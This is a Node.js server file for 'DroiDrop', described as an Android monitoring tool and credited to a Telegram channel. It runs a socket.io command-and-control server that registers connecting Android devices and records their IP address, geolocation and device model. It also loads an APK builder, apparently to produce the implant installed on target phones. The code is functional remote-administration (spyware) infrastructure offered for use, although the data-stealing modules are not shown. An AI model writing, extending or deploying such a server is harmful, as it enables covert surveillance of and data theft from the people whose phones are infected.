/* 
*   DroiDrop
*   An Android Monitoring Tools
*   By t.me/efxtv
*/


const
    express = require('express'),
    app = express(),
    IO = require('socket.io'),
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// Mark all clients as offline on startup to prevent state drift
let clients = db.maindb.get('clients').value();
if (!Array.isArray(clients)) {
    console.error('Error: clients field is missing or not an array in maindb.json');
    process.exit(1);
}
clients.forEach(client => {
    client.isOnline = false;
});
db.maindb.write();

// spin up socket server with memory-safe buffer limits
let client_io = IO(CONST.control_port, {
    maxHttpBufferSize: 10 * 1024 * 1024 // 10MB limit to prevent OOM
});

client_io.sockets.pingInterval = 30000;
client_io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    
    // Patch 1: Validate clientID
    if (!clientParams.id || typeof clientParams.id !== 'string' || clientParams.id.trim() === '' || clientParams.id.length > 200) {
        return socket.disconnect();
    }

    // Patch 5: Reliable IP extraction for IPv6 and IPv4-mapped
    let clientIP = socket.handshake.address;
    if (clientIP.includes('::ffff:')) {
        clientIP = clientIP.split(':').pop();
    } else if (clientIP.includes(':')) {
        // Native IPv6 - keep as is for GeoIP if possible, or handle specifically
        // For now, ensure we don't just pop a random segment
    }
    
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model || 'unknown',
            manufacture: clientParams.manf || 'unknown',
            version: clientParams.release || 'unknown'
        }
    });

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);    // original call
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);      // additional call to catch-all
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }

});


// get the admin interface online
app.listen(CONST.web_port);

/* 
*   
*   
*   t.me/efxtv
*/

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.set('trust proxy', 'loopback');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));
